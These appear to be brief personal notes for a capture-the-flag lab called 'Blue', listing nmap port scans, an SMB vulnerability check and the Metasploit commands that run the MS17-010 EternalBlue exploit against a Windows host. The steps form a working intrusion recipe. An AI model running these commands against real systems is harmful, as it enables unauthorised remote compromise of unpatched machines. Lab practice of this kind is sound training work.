1 
nmap -p- <target_ip>
nmap -p 1-999 <target_ip>

Blue → Windows → open 445 → MS17-010 (EternalBlue)

check
nmap -p 445 --script=smb-vuln-ms17-010 <target_ip>

2
msfconsole
search ms17_010
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS <target_ip>
run

3



